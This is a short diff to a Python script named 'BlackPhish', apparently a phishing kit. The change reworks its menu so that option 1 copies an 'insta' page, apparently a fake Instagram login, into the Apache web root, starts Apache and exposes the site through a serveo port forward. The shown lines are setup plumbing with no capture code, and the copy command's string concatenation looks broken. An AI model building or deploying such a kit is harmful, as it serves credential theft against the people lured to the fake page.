@@ -46,15 +46,11 @@ def serveo_forward(): # Port forward to serveo#
 def main():  # Main script #
 	platform()
 
-	serveo_forward()
-
-	os.system('cp ' + cwd + '/' + ' insta' '/var/www/html/')
-
-	choice = input(magenta + "[BlackPhish] -> ") # Get user input #
+	choice = input("[BlackPhish] -> ") # Get user input #
 
 	if choice == "1":
 		print(green + '[+] Copying Files')
-		install()
+		os.system('cp ' + cwd + '/' + ' insta' '/var/www/html/')
 		print(green + '[+] Starting Apache2 Service')
 		os.system('service apache2 start')
 		serveo_forward()
